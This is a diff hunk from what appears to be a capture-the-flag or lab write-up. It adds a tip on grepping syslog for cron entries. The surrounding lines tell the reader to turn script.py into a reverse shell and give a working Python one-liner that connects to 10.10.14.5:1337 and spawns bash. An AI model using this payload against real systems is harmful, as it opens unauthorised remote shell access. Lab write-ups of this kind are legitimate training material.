@@ -160,3 +160,5 @@ Edit script.py to a reverse shell.
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
 ```
+
+You could use `grep CRON syslog` to inspect only cronjobs on logs.
